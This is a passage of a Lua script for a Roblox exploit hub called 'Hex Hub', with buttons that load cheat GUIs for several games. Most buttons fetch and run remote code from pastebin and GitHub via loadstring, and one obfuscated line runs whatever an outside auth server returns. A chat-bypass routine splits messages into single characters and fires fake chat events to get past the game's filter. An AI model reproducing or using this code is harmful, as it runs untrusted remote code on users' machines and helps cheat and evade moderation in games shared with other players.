    loadstring(game:HttpGet("https://pastebin.com/raw/WnWVpzzr", true))()
end)

local OtherSection = Player:NewSection("Other")

OtherSection:NewButton("Chat Bypass Script(NEW!!!)", "Lets you sayw hat ever you want(words only)", function()
	local CoolGUI = Instance.new("ScreenGui")
local MainGUI = Instance.new("Frame")
local TextBox = Instance.new("TextBox")
local ActivateBTN = Instance.new("TextButton")
local UICorner = Instance.new("UICorner")
local UICorner_2 = Instance.new("UICorner")
local IntroductionGUI = Instance.new("Frame")
local UICorner_3 = Instance.new("UICorner")
local TextLabel = Instance.new("TextLabel")

CoolGUI.Name = "CoolGUI"
CoolGUI.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
CoolGUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

MainGUI.Name = "MainGUI"
MainGUI.Parent = CoolGUI
MainGUI.AnchorPoint = Vector2.new(0.5, 0.5)
MainGUI.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
MainGUI.BorderSizePixel = 0
MainGUI.Position = UDim2.new(0.5, 0, -1, 0)
MainGUI.Size = UDim2.new(0, 556, 0, 36)

TextBox.Parent = MainGUI
TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextBox.BackgroundTransparency = 1.000
TextBox.BorderSizePixel = 0
TextBox.Size = UDim2.new(0.881578922, 0, 1, 0)
TextBox.Font = Enum.Font.Gotham
TextBox.PlaceholderText = "Insert Word Here"
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.TextSize = 14.000

ActivateBTN.Name = "ActivateBTN"
ActivateBTN.Parent = MainGUI
ActivateBTN.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
ActivateBTN.BorderSizePixel = 0
ActivateBTN.Position = UDim2.new(0.881578922, 0, 0, 0)
ActivateBTN.Size = UDim2.new(0.118421055, 0, 1, 0)
ActivateBTN.Font = Enum.Font.GothamBold
ActivateBTN.Text = "<"
ActivateBTN.TextColor3 = Color3.fromRGB(255, 255, 255)
ActivateBTN.TextSize = 20.000

UICorner.Parent = ActivateBTN

UICorner_2.Parent = MainGUI

IntroductionGUI.Name = "IntroductionGUI"
IntroductionGUI.Parent = CoolGUI
IntroductionGUI.AnchorPoint = Vector2.new(0.5, 0.5)
IntroductionGUI.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
IntroductionGUI.BorderSizePixel = 0
IntroductionGUI.Position = UDim2.new(0.5, 0, -1, 0)
IntroductionGUI.Size = UDim2.new(0, 556, 0, 36)

UICorner_3.Parent = IntroductionGUI

TextLabel.Parent = IntroductionGUI
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderSizePixel = 0
TextLabel.Size = UDim2.new(1, 0, 1, 0)
TextLabel.Font = Enum.Font.GothamBold
TextLabel.Text = "Welcome to Hex Hub Bypasser(all Credit goes to kaid for the script), Press L to Activate the GUI."
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 14.000

local function GXNXTWW_fake_script()
local script = Instance.new('LocalScript', MainGUI)

local Mouse = game.Players.LocalPlayer:GetMouse()
local isappeared = false

Mouse.KeyDown:Connect(function(k)
if k == "l" then
if isappeared == false then
script.Parent:TweenPosition(UDim2.new(0.5,0,0.2,0), "Out", "Quad", 0.5, true)
isappeared = true
else
script.Parent:TweenPosition(UDim2.new(0.5,0,-1,0), "Out", "Quad", 0.5, true)
isappeared = false
end
end
end)

script.Parent.ActivateBTN.MouseButton1Click:connect(function()
-- Chat bypass script by Kaid#0001 :3
script.Parent.ActivateBTN.BackgroundColor3 = Color3.new(0.180392, 0.870588, 0.239216)

local message = script.Parent.TextBox.Text

math.randomseed(tick())
local ChatMain = require(game:GetService("Players").LocalPlayer.PlayerScripts.ChatScript.ChatMain)

local function bypass()
ChatMain.MessagePosted:fire("dffhdfshfd"..math.random(100000,1000000))
ChatMain.MessagesChanged:fire(math.random(100000,1000000))
end

for v in message:gmatch"." do
wait(.5)
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(v, "All")
wait(.5)
bypass()
end

wait(1)

script.Parent.ActivateBTN.BackgroundColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
end)
end
coroutine.wrap(GXNXTWW_fake_script)()
local function KDEKJQX_fake_script()
local script = Instance.new('LocalScript', IntroductionGUI)

wait(1)
script.Parent:TweenPosition(UDim2.new(0.5,0,0.2,0), "Out", "Quad", 0.5, true)
wait(3)
script.Parent:TweenPosition(UDim2.new(0.5,0,-1,0), "Out", "Quad", 0.5, true)
end
coroutine.wrap(KDEKJQX_fake_script)()
end)

--Games section

local Player = Window:NewTab("Games")
local GameSection = Player:NewSection("Games")

GameSection:NewButton("Knife ability Test", "Loads a GUI for Kat", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/78kG7trR", true))()
end)

GameSection:NewButton("Flee The Facility", "Loads a GUI for FTF", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/khoaScript/scripts/master/flee-the-facility.lua"))()
end)

GameSection:NewButton("Murder Mystery", "Loads a GUI for MM2", function()
    --Credits to Ethan for spending 6 months working on the hottest GUI in the community!!!!--

--If you are experiencing issues with lag, Please place this line of code on top of the script before executing!--

getgenv().OptimizeScript = true

--Script--
getgenv().mainKey = "nil"

local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https://api.eclipsehub.xyz/auth"c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
end)

GameSection:NewButton("JailBreak AutoRob", "Loads a GUI for JB", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/wawsdasdacx/ohascriptnrrewading/main/jbsaxcriptidk1"))();
end)

GameSection:NewButton("Raise a floppa!", "made by RIP#6666", function()
	--Script :
_G.RedGUI = true
_G.Theme = "Dark" -- Must disable or remove _G.RedGUI to use
--Themes: Light, Dark, Mocha, Aqua and Jester
_G.V3rmillion = true

loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/raiseafloppa.lua"))()
end)

--Credits

local Credits = Window:NewTab("Credits")
local CreditSection = Credits:NewSection("Creators")

CreditSection:NewLabel("Made by !!!Swax#2600")

CreditSection:NewKeybind("Minimize UI", "Click on the keybind to change it", Enum.KeyCode.RightShift, function()
	Library:ToggleUI()
end)

local BetaSection = Credits:NewSection("Beta Testers")

BetaSection:NewButton("@rpat0717", "This is the first person to test it out except me", function()
	Print("tf")
end)

BetaSection:NewButton("@HelloIamTheAlpha", "Helped Out with the design process", function()
	Print("tf")
end)